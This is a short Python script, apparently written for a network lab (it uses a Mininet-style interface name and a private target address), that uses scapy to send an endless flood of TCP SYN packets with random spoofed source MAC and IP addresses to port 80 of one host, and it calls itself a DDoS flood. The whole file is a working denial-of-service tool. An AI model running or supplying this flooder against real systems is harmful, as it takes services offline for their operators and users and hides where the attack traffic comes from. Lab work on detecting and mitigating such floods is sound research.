from scapy.all import Ether, IP, TCP, sendp, RandMAC, RandIP
import time

print("Starting MAC/IP Spoofed DDoS Flood...")
try:
    while True:
        # Generate packet with Random MAC and IP to create thousands of flows
        pkt = Ether(src=RandMAC(), dst="00:00:00:00:00:02") / \
              IP(src=RandIP(), dst="10.0.0.2") / \
              TCP(dport=80, flags="S")
        sendp(pkt, iface="h1-eth0", verbose=0)
except KeyboardInterrupt:
    print("\nAttack stopped.")
